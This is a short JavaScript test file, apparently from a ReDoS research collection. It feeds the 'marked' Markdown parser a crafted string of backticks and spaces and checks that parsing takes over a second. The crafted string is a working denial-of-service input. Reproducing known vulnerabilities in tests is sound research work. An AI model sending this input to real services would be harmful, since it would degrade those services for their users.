//https://github.com/sola-da/ReDoS-vulnerabilities/blob/master/test-marked.js
test("ReDos in marked", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const marked = require('marked');

    let str = genstr(8, "`") + genstr(700, " ") + genstr(11, "`")

    let t =measureTime(function () {
        var agent = marked(str);
    });

    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
});